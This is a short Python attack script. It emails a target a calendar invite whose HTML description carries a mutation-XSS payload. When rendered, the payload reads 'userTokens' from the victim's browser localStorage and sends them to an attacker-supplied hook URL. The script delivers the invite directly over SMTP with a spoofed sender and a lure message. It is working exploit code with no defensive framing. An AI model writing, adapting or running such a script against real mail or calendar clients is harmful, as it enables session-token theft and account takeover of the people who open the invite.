import argparse
import smtplib
import time

def pargs():
    p = argparse.ArgumentParser()
    p.add_argument('url', help='base url')
    p.add_argument('--to', required=True, help='targ')
    p.add_argument('--hook', required=True, help='hook')
    return p.parse_args()

args = pargs()

js = f"""
(function(){{var t=localStorage.getItem('userTokens');var i=new Image();i.src='{args.hook}/?t='+encodeURIComponent(btoa(t));}})()"""
payload = f'<math><mtext><mglyph><style><img src=x onerror="{js}"></style>'

eml = (
    'From: noreply@test.local\r\n'
    'To: ' + args.to + '\r\n'
    'Subject: yo heres the invite\r\n'
    'Content-Type: multipart/mixed; boundary="cal"\r\n'
    '\r\n'
    '--cal\r\n'
    'Content-Type: text/plain\r\n'
    '\r\n'
    'you have been invited to the next hangout g congrats\r\n'
    '--cal\r\n'
    'Content-Type: text/calendar; method=REQUEST\r\n'
    '\r\n'
    'BEGIN:VCALENDAR\r\n'
    'VERSION:2.0\r\n'
    'PRODID:-//Test//EN\r\n'
    'BEGIN:VEVENT\r\n'
    'UID:' + str(int(time.time())) + '@test.local\r\n'
    'DTSTAMP:20260925T120000Z\r\n'
    'DTSTART:20260925T130000Z\r\n'
    'DTEND:20260925T140000Z\r\n'
    'SUMMARY:Meeting\r\n'
    'X-ALT-DESC;FMTTYPE=text/html:<html><body>' + payload + '</body></html>\r\n'
    'END:VEVENT\r\n'
    'END:VCALENDAR\r\n'
    '--cal--\r\n'
)

host = args.url.split('//')[1].split('/')[0]
sent = False
for i in range(5):
    try:
        # swap me out if you want
        s = smtplib.SMTP(host, 25, timeout=15)
        s.ehlo()
        s.docmd('MAIL FROM:<important@lol.com>')
        s.docmd('RCPT TO:<' + args.to + '>')
        s.docmd('DATA')
        s.send(eml.encode())
        res = s.docmd('.')
        s.quit()
        if res[0] < 300:
            sent = True
            break
        print(f'got {res}')
    except Exception as e:
        print(f"got {e}")
    time.sleep(5)

if not sent:
    print('wtf')
    exit(1)
print('+ sent pl')
